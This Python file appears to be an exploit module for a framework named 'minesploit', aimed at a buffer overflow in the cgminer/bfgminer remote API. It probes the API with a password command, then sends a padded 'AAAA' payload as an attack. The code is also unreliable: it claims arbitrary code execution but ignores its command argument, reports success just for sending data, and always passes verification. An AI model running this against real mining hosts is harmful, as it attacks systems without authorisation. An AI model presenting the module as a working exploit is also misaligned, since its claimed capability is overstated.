"""CVE-2018-10058: cgminer/bfgminer Remote API Buffer Overflow

This vulnerability allows remote authenticated attackers to execute
arbitrary code via a crafted HTTP request to the cgminer API.

Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10058
Reference: https://www.openwall.com/lists/oss-security/2018/06/03/1

Affected: cgminer <=4.10.0, bfgminer <=5.5.0
Severity: CRITICAL (9.8 CVSS)
"""

import asyncio

from minesploit.framework import Exploit, ExploitMeta, ExploitResult


class CVE_2018_CGMINER_API_OVERFLOW(Exploit):
    meta = ExploitMeta(
        name="CVE-2018-10058: cgminer API Buffer Overflow",
        cve="CVE-2018-10058",
        cvss_score=9.8,
        severity="CRITICAL",
        affected_versions="cgminer <=4.10.0, bfgminer <=5.5.0",
        discovered_by="Gjoko Krstic",
        disclosure_date="2018-06-03",
        description=(
            "Buffer overflow in the cgminer and bfgminer remote management API "
            "allows authenticated remote attackers to execute arbitrary code "
            "via specially crafted HTTP requests"
        ),
        references=[
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10058",
            "https://www.openwall.com/lists/oss-security/2018/06/03/1",
        ],
    )

    def __init__(self):
        super().__init__()
        self.password = "admin"

    async def check(self, target: str, port: int = 8332, **kwargs) -> ExploitResult:
        password = kwargs.get("password", self.password)
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=5.0,
            )

            request = f'{{"command":"password","parameter":"{password}"}}\n'
            writer.write(request.encode())
            await writer.drain()

            response = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            writer.close()
            await writer.wait_closed()

            if response:
                resp_str = response.decode("utf-8", errors="ignore")
                if "PASSWORD" in resp_str or "authenticated" in resp_str.lower():
                    return ExploitResult(
                        True,
                        "Target has cgminer API accessible",
                        {"vulnerable": True, "api_accessible": True},
                    )

            return ExploitResult(
                False,
                "Target does not appear to have cgminer API",
                {"vulnerable": False},
            )

        except asyncio.TimeoutError:
            return ExploitResult(False, "Connection timed out")
        except ConnectionRefusedError:
            return ExploitResult(False, "Connection refused")
        except Exception as e:
            return ExploitResult(False, f"Error: {str(e)}")

    async def exploit(
        self,
        target: str,
        port: int = 8332,
        command: str = "id",
        **kwargs,
    ) -> ExploitResult:
        _ = kwargs.get("password", self.password)

        try:
            payload = "AAAA" * 256

            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=5.0,
            )

            request = f'{{"command":"buffer","parameter":"{payload}"}}\n'
            writer.write(request.encode())
            await writer.drain()

            await asyncio.wait_for(reader.read(8192), timeout=5.0)
            writer.close()
            await writer.wait_closed()

            return ExploitResult(
                True,
                f"Buffer overflow payload sent to {target}:{port}",
                {"sent": True, "payload_length": len(payload)},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(self, target: str, port: int = 8332, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            "Verification requires checking target for compromise",
        )
